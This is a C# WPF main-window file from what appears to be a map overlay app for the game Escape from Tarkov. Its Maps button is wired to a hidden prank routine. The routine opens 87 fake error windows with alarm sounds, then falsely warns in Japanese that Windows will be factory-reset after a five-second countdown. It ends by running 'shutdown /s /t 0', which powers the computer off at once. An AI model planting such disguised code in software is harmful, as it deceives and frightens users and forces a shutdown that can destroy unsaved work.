using System.Diagnostics;
using System.IO;
using System.Media;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using TarkovMap.util;
using Application = System.Windows.Application;
using Color = System.Windows.Media.Color;
using HorizontalAlignment = System.Windows.HorizontalAlignment;

namespace TarkovMap;

public partial class MainWindow : Window
{
    private ShortCutHandler scHandler;
    
    public MainWindow()
    {
        InitializeComponent();
        scHandler = new ShortCutHandler(this, (w,n) =>
        {
            // if (!n.Visible)
            // {
            //     w.Hide();
            //     n.Visible = true;
            // }
            // else
            // {
            //     w.Show();
            //     n.Visible = false;
            // }
        });

        Background = new SolidColorBrush(Color.FromArgb(64, 0,0,0));
    }

    private void HandleExitButton(object sender, RoutedEventArgs e)
    {
        Application.Current.Shutdown();
        scHandler.Close();
    }

    private void HandleMapsButton(object sender, RoutedEventArgs e)
    {
        // scHandler.Close();
        // SelectingMapsWindow window = new SelectingMapsWindow();
        // window.Show();
        // Close();

        asobi();
    }

    private void WindowLoaded(object sender, RoutedEventArgs e)
    {
        scHandler.ShortCutRegister();
    }

    private async void asobi()
    {
        for (int i = 0; i < 87; i++)
        {
            if (i * 30 + 150 >= 1080)
            {
                if (i * 30 + 300 >= 1920)
                {
                    CreateErrorWindow($"エラーが発生しました", 30 * 54, 1080 - (30 * (i - 54) + 150));
                    SystemSounds.Hand.Play();
                    await Task.Delay(80);
                    continue;   
                }
                CreateErrorWindow($"エラーが発生しました", i * 30, 30 * 31);
                SystemSounds.Hand.Play();
                await Task.Delay(80);
                continue;
            }
            CreateErrorWindow($"エラーが発生しました", i * 30, i * 30);
            SystemSounds.Hand.Play();
            await Task.Delay(80);
        }

        TextBlock textBlock = new TextBlock
        {
            Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 5",
            FontSize = 40,
            TextWrapping = TextWrapping.Wrap,
            VerticalAlignment = VerticalAlignment.Center,
            HorizontalAlignment = HorizontalAlignment.Center,
            
        };

        Window window = new Window
        {
            Title = "致命的な不具合",
            Content = textBlock,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            Background = Brushes.Red
        };
        window.Show();
        
        await Task.Delay(1000);
        textBlock.Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 4";
        SystemSounds.Beep.Play();
        await Task.Delay(1000);
        textBlock.Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 3";
        SystemSounds.Beep.Play();
        await Task.Delay(1000);
        textBlock.Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 2";
        SystemSounds.Beep.Play();
        await Task.Delay(1000);
        textBlock.Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 1";
        SystemSounds.Beep.Play();
        await Task.Delay(1000);
        textBlock.Text = "Windowsに致命的な不具合が発生したため、自動的に工場出荷状態に初期化します。\n                                                     初期化まで: 0";
        await Task.Delay(1000);
        
        Stream naStream = Application.GetResourceStream(new Uri("pack://application:,,,/assets/sounds/na.wav"))?.Stream;

        SoundPlayer player = new SoundPlayer(naStream);
        player.Play();
        
        await Task.Delay(2000);
        Process.Start(new ProcessStartInfo
        {
            FileName = "shutdown",
            Arguments = "/s /t 0", 
            RedirectStandardOutput = true,
            UseShellExecute = false, CreateNoWindow = true 
        });
    }

    private void CreateErrorWindow(string message, double offsetX, double offsetY)
    {
        Window errorWindow = new Window
        {
            Title = "エラー",
            Content = message,
            Width = 300,
            Height = 150,
            WindowStartupLocation = WindowStartupLocation.Manual,
            Left = offsetX,
            Top = offsetY,
            WindowStyle = WindowStyle.None
        };

        errorWindow.Show();
    }
}